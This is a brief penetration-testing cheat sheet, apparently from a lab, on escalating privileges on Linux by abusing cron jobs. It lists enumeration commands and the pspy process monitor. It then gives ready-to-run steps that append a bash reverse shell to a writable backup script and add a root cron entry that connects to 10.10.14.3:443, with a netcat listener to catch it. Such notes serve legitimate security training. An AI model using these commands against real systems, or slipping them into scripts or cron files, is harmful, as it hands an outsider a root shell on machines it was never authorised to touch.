# Cron Job Abuse

## Find World-Writable Files (Potential Cron Scripts)

```bash
find / -path /proc -prune -o -type f -perm -o+w -exec ls -lah {} + 2>/dev/null
```

## Inspect Suspicious Directories

```bash
ls -lah /dmz-backups/
```

## List Cron Jobs

```bash
crontab -l
sudo crontab -l
cat /etc/crontab
```

## Check /etc/cron.d

```bash
ls -lah /etc/cron.d/
cat /etc/cron.d/* 2>/dev/null
```

## Monitor Processes With pspy

Download:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
```

Run:

```bash
./pspy64 -pf -i 1000
```

## Abusing a Writable Script (Example: /dmz-backups/backup.sh)

Backup:

```bash
cp /dmz-backups/backup.sh /dmz-backups/backup.sh.bak
```

Append reverse shell:

```bash
echo "bash -i >& /dev/tcp/10.10.14.3/443 0>&1" >> /dmz-backups/backup.sh
```

Listener (attacker):

```bash
nc -lnvp 443
```

Restore:

```bash
cp /dmz-backups/backup.sh.bak /dmz-backups/backup.sh
```

## Abusing a Writable Cron File (Example: /etc/cron.d/vulnerable_cron)

Backup:

```bash
cp /etc/cron.d/vulnerable_cron /etc/cron.d/vulnerable_cron.bak
```

Add malicious entry:

```bash
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'" >> /etc/cron.d/vulnerable_cron
```

Restore:

```bash
cp /etc/cron.d/vulnerable_cron.bak /etc/cron.d/vulnerable_cron
```
